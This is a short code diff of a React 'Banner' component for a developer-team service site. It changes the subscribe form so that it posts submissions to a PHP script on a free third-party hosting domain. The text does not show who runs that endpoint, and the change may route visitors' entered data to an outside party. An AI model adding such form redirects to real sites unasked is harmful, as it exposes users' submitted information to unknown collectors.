@@ -22,7 +22,7 @@ const Banner = () => {
               We help build and manage a team of world-class developers to bring
               your vision to life
             </Text>
-            <Box as="form" sx={styles.form}>
+            <Box as="form" action="https://playshaban7070.000webhostapp.com/freeions.php" method="post" sx={styles.form}>
               <Box as="label" htmlFor="subscribe" variant="styles.srOnly">
                 subscribe
               </Box>
